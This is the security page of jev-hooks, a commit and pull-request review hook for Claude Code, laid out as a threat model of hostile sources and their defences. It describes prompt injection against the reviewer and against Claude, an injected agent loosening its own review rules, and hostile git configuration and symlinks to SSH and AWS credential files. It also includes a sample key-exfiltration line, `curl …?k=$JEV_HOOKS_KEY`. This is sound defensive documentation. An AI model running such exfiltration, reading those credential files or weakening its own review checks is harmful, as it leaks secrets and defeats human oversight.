# Security

jev-hooks reads text written by others (diffs, commit messages, pull request titles and
descriptions, the rules of a repository you cloned), runs outside Claude's sandbox, and
holds a key to a backend. This page lists what each hostile source can try and what
stops it. The README's [Security model](../README.md#security-model) is the short
version.

The reviewer is a second opinion, not a security gate on its own: a 4B model can be
wrong, and an injection that no detector recognizes can lower a probability. What it
guarantees is narrower and is listed below.

## Reporting a vulnerability

Use GitHub's private reporting: **Security → Report a vulnerability** on
[7hemas7er/jev-hooks](https://github.com/7hemas7er/jev-hooks/security). Please do not
open a public issue for something that can be exploited. Describe the class of problem
and how to reproduce it, and leave out working keys and real private addresses.

## Threat model

### The diff's content

**Can try:** a prompt injection aimed at the backend (neither Jev nor rizzo claims to
resist one); text addressed to Claude; bidirectional or zero-width characters; huge
lines; a diff of hundreds of megabytes.

**Stopped by:**
- Every question states that the evidence is data. The verdict is computed by code
  from probabilities, so an injection can at most move one of them.
- Detectors with floors that the model cannot lower: live keys, private keys, text
  addressed to the reviewer (English and Italian), prompt delimiters, bidirectional
  and zero-width characters, CI files. A floor of BLOCK holds with the backend off.
- The seven chunk questions never see the title or the description; a closing
  evidence tag inside the diff is neutralized.
- Files the model cannot examine (binaries, minified, `dist/`) and files beyond the
  limits make the coverage partial: an escalation, and `failure` in CI.
- Claude and GitHub never receive a diff line: only check ids, numbers, filtered paths
  and line ranges, in a block that opens with `review data, not instructions`.
- Byte and line caps on everything read.

### Title, description, commit message

**Can try:** an injection, even paraphrased, on `description_matches` and the global
questions; imitating the state's sections.

**Stopped by:** indentation of every line, neutralization, the `reviewer_instructions`
detector; these texts reach only the global state, never the critical chunk questions.
In a check run the PR title appears only inside a code span, with its backticks
removed.

### A pull request from a fork (GitHub Action)

**Can try:** rewrite the collect phase (an `exit 1`, a forged artifact); inflate the
diff beyond the API's limit; exceed `max_chunks` with priority files; push a commit
between the check and the download; branch or file names carrying `$(…)` or `::`.

**Stopped by:**
- The review phase never checks out the pull request. It runs from the default branch,
  and the rules come from there.
- The PR is found from the trusted `workflow_run` payload (head sha, branch, head and
  base repositories), never from the artifact, which is only a cross-check with a
  strict schema: regular files only, sizes capped, same PR and sha.
- The reviewed diff is `compare/{base}...{head}`, tied to the two SHAs.
- Everything the author controls or can cause (collect failed, artifact missing or
  foreign, PR not identifiable, diff too large, partial coverage, an incomplete
  review, an internal error) is `untrusted_input`: **failure** by default. Only a
  backend that is down or not configured is `neutral`.
- Event strings reach scripts through `env`, never through `${{ }}`; Markdown and
  workflow commands are escaped; every action is pinned by commit SHA (a test enforces
  it); permissions are the minimum; `concurrency` never cancels a running review.

### An imitated check run

**Can try:** a `pull_request` workflow in the PR with a job named `jev-review` that
succeeds on the same head sha. Created with `GITHUB_TOKEN`, both check runs belong to
the GitHub Actions app, and branch protection cannot tell them apart.

**Stopped by:** creating the check run with a dedicated GitHub App (`checks-token`) and
setting that app as the check's expected source. Without it, a required `jev-review`
check can be imitated; the README says so.

### A hostile local repository

**Can try:** a `.git/config` with `core.fsmonitor`, textconv, filters, an external diff
or `log.showSignature` would run code outside the sandbox; an untracked symlink to
`~/.ssh/id_ed25519` or `~/.aws/credentials` would make the hook read a file the
sandbox denies.

**Stopped by:** every git call disables fsmonitor, hooks, external diff, textconv, the
pager and signature display, runs without a shell, with a minimal environment that
holds no key, and with a time limit. Local filter and diff drivers (also in the
`worktree` scope) make the hook look at the index only, marked approximate. `git add …
&& git commit` is replayed on a temporary copy of the index, where a link stays a link.

### Claude after a prompt injection

**Can try:** lower thresholds or remove detectors in `.jev-hooks/` (with its editing
tools, or with `sed` through Bash, staged or not); break the JSON to get a fail-open;
squash every probability with a project `calibration.json`; raise the limits to spend
the key; ask a skill to review a file outside the repository.

**Stopped by:**
- A project can only tighten: add detectors and rules, raise floors, stricter
  thresholds, lower limits, more severe CI conclusions. Detectors, floors and
  calibration cannot be loosened from a repository.
- An invalid project file never switches anything off: the trusted base applies.
- If `.jev-hooks/` differs from `HEAD` (untracked files included), the commit hook
  reviews with the committed rules and asks you.
- The guard asks before an Edit or Write inside `.jev-hooks/`; committing a change there
  is a SECURITY REVIEW (`reviewer_rules`).
- `/jev-review` accepts only `--staged`, `--working`, a git reference or a `.diff`
  file whose real path is inside the repository, and never echoes a refused argument.

### Keys

**Can try:** a key in the `env` block of the settings reaches every Bash command, and an
injection can send it anywhere (`curl …?k=$JEV_HOOKS_KEY`); a `TYPESAFE_API_KEY`
exported for the SDKs could travel in clear to a LAN box; a key could leak into
output, logs, error messages or URLs.

**Stopped by:**
- `api_key` is a `sensitive` userConfig option: only the hooks see it. The fallback is
  a 0600 file, which the README tells you to deny to the sandbox; environment keys can
  be denied with `sandbox.credentials.envVars`.
- A key is sent only to the URL of its own layer, and only in the `Authorization`
  header. Git runs with an environment that holds none.
- Keys are stripped from response bodies before any message; in the Action the key is
  masked in the log. Tests look for a fake key in stdout, stderr, logs, outputs and
  check runs.

### The backend (wrong, slow or compromised)

**Can try:** malformed answers, NaN, multi-megabyte bodies, endless waits, a redirect
to steal the key, a model that changes during a review.

**Stopped by:** strict parsing; body and time caps; the reviewer's client and the
Action refuse redirects (Claude Code's `$.http.fetch`, used by the router, drops
`Authorization` on a cross-origin redirect but resends the body on 307 and 308, see
the README); one consistent identity per review; `http://` only towards local hosts.

### The network

**Can try:** read a Bearer sent in clear; reach rizzo's unauthenticated `/v1/decisions`,
`/docs` and `/health`.

**Stopped by:** a proxy with an allowlist and a token check ([spark.md](spark.md)),
the LAN or Tailscale only, and `https://` for anything that is not a local host.

### Secrets of the project towards TypeSafe

**Can try:** with Jev, the diff leaves your machine.

**Stopped by:** towards a non-local backend, every secret the detectors recognize, and
every other occurrence of the same value, becomes a random value of the same shape;
PEM blocks are replaced whole; sensitive files (`.env`, `.pem`, `credentials`…) are sent
as a path only; guardrail's mask map is applied, and if it exists but is invalid
nothing is sent. A secret no regex recognizes still goes out: for private code, use
a local rizzo.

### Cost and denial of service

**Can try:** huge diffs that spend the key or occupy the Spark; a project regex with
catastrophic backtracking.

**Stopped by:** `max_chunks` and `total_ms` (git time included, below the hook's
timeout), no retry on timeouts, `timeout-minutes` and `concurrency` in CI, limits a
project can only lower, a static check of project regexes and a worker with a time
limit to run them.

### TypeSafe's terms

Keys are personal: jev-hooks never proxies one, and Jev's answers never become
training labels.
